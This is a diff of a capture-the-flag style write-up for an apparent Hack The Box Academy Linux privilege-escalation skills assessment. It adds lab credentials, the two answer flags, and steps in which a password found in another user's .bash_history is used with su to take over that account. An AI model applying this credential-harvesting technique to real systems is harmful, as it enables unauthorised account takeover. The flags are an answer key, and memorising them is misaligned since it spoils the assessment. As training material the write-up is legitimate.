@@ -1,5 +1,26 @@
 # Linux Local Privilege Escalation - Skills Assessment
 
+Username
+```python
+htb-student
+```
+
+Password
+```python
+Academy_LLPE!
+```
+
+IP
+```python
+10.129.30.244
+```
+
+SSH
+```python
+ssh htb-student@10.129.30.244
+```
+
+
 ## TOC
 - []()
 - []()
@@ -10,7 +31,7 @@
 - []()
 - []()
 
-##Enumeration
+## Enumeration
 
 ##### Enumerating the `/etc/passwd` file, there are three additional users: mrb3n,tomact, barry
 
@@ -66,7 +87,12 @@ usr
 var
 ```
 
-##### Flag
+##### Flag1
+
+```python
+LLPE{d0n_ov3rl00k_h1dden_f1les!}
+```
+
 ```python
 htb-student@nix03:~$ ls -la
 total 32
@@ -94,23 +120,52 @@ htb-student@nix03:~/.config$ cat .flag1.txt
 LLPE{d0n_ov3rl00k_h1dden_f1les!}
 ```
 
-Username
+##### Flag 2
+
 ```python
-htb-student
+LLPE{ch3ck_th0se_cmd_l1nes!}
 ```
 
-Password
+Flag2 is in the home directory of the user `barry` but I can't read it
 ```python
-Academy_LLPE!
+htb-student@nix03:/home/barry$ ls -la
+total 40
+drwxr-xr-x 5 barry barry 4096 Sep  5  2020 .
+drwxr-xr-x 5 root  root  4096 Sep  6  2020 ..
+-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
+-rw-r--r-- 1 barry barry  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 barry barry 3771 Feb 25  2020 .bashrc
+drwx------ 2 barry barry 4096 Sep  5  2020 .cache
+-rwx------ 1 barry barry   29 Sep  5  2020 flag2.txt
+drwxrwxr-x 3 barry barry 4096 Sep  5  2020 .local
+-rw-r--r-- 1 barry barry  807 Feb 25  2020 .profile
+drwx------ 2 barry barry 4096 Sep  5  2020 .ssh
 ```
 
-IP
+Looking at the bash_history, `barry` ssh'd into `barry_adm@dmz1.inlanefreight.local` with the below password
 ```python
-10.129.30.244
+i_l0ve_s3cur1ty!
 ```
 
-SSH
+su'd into barry with the above password and gained #flag2
 ```python
-ssh htb-student@10.129.30.244
+ su barry
+Password: 
+barry@nix03:~$ ls -la
+total 40
+drwxr-xr-x 5 barry barry 4096 Sep  5  2020 .
+drwxr-xr-x 5 root  root  4096 Sep  6  2020 ..
+-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
+-rw-r--r-- 1 barry barry  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 barry barry 3771 Feb 25  2020 .bashrc
+drwx------ 2 barry barry 4096 Sep  5  2020 .cache
+-rwx------ 1 barry barry   29 Sep  5  2020 flag2.txt
+drwxrwxr-x 3 barry barry 4096 Sep  5  2020 .local
+-rw-r--r-- 1 barry barry  807 Feb 25  2020 .profile
+drwx------ 2 barry barry 4096 Sep  5  2020 .ssh
+barry@nix03:~$ cat flag2.txt
+LLPE{ch3ck_th0se_cmd_l1nes!}
 ```
+
+
 
